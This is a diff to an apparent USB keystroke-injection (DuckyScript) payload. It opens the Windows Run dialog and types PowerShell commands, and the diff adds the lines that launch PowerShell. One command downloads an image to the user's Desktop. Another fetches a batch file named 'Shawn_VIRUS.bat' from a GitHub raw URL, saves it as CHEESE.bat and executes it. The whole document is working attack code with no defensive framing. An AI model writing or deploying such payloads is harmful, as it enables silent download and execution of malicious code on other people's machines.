@@ -1,12 +1,15 @@
 DELAY 1000
 GUI r
+STRING powershell
 DELAY 200
 STRING $u='https://raw.githubusercontent.com/GOD-png/shawn/main/Shawn-Albe-Freako/shawn.jpg'; $o="$env:USERPROFILE\Desktop\shawn.jpg"; Invoke-WebRequest $u -OutFile $o
 DELAY 200
 ENTER
 DELAY 200
 GUI r
+STRING powershell
 DELAY 200
 STRING $u='https://raw.githubusercontent.com/GOD-png/shawn/main/Shawn-Albe-Freako/Shawn_VIRUS.bat'; $o="$env:USERPROFILE\Desktop\CHEESE.bat"; Invoke-WebRequest $u -OutFile $o; Start-Process $o
 DELAY 200
 ENTER
+
